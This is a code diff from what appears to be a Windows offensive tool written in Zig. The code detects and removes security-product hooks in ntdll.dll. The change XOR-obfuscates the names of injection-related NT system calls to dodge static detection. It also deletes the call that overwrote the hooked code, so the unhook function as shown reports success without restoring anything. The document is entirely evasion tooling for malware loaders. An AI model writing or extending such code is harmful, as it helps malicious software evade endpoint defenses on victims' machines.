@@ -6,6 +6,13 @@ const peb_walk = @import("../types/peb_walk.zig");
 
 const E = struct {
     pub const known_dlls = hash.xorEncrypt("\\KnownDlls\\ntdll.dll");
+    pub const nt_alloc = hash.xorEncrypt("NtAllocateVirtualMemory");
+    pub const nt_protect = hash.xorEncrypt("NtProtectVirtualMemory");
+    pub const nt_write = hash.xorEncrypt("NtWriteVirtualMemory");
+    pub const nt_create_thread = hash.xorEncrypt("NtCreateThreadEx");
+    pub const nt_open_process = hash.xorEncrypt("NtOpenProcess");
+    pub const nt_open_key = hash.xorEncrypt("NtOpenKey");
+    pub const nt_query_key = hash.xorEncrypt("NtQueryValueKey");
 };
 
 fn getNtdllTextSection(ntdll_base: types.PVOID) ?struct { base: usize, size: usize } {
@@ -69,14 +76,25 @@ pub fn isHooked(ntdll_base: types.PVOID) bool {
     const text = getNtdllTextSection(ntdll_base) orelse return false;
     const text_bytes: [*]const u8 = @ptrFromInt(text.base);
 
+    var nt_alloc_buf: [E.nt_alloc.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_alloc, &nt_alloc_buf);
+    var nt_protect_buf: [E.nt_protect.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_protect, &nt_protect_buf);
+    var nt_write_buf: [E.nt_write.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_write, &nt_write_buf);
+    var nt_create_thread_buf: [E.nt_create_thread.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_create_thread, &nt_create_thread_buf);
+    var nt_open_process_buf: [E.nt_open_process.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_open_process, &nt_open_process_buf);
+    var nt_open_key_buf: [E.nt_open_key.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_open_key, &nt_open_key_buf);
+    var nt_query_key_buf: [E.nt_query_key.len]u8 = undefined;
+    hash.xorDecrypt(&E.nt_query_key, &nt_query_key_buf);
+
     const hooked_funcs = [_][]const u8{
-        "NtAllocateVirtualMemory",
-        "NtProtectVirtualMemory",
-        "NtWriteVirtualMemory",
-        "NtCreateThreadEx",
-        "NtOpenProcess",
-        "NtOpenKey",
-        "NtQueryValueKey",
+        nt_alloc_buf[0..], nt_protect_buf[0..], nt_write_buf[0..],
+        nt_create_thread_buf[0..], nt_open_process_buf[0..],
+        nt_open_key_buf[0..], nt_query_key_buf[0..],
     };
 
     for (hooked_funcs) |func_name| {
@@ -151,15 +169,6 @@ pub fn unhookNtdll() bool {
         &prot_size,
         old_prot,
         &old_prot,
-    );
-
-    var bytes_written: types.SIZE_T = 0;
-    _ = engine.NtWriteVirtualMemory(
-        @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
-        @as(types.PVOID, @ptrFromInt(text.base)),
-        @as(types.PVOID, @ptrFromInt(clean_text.base)),
-        text.size,
-        &bytes_written,
     );
 
     return true;
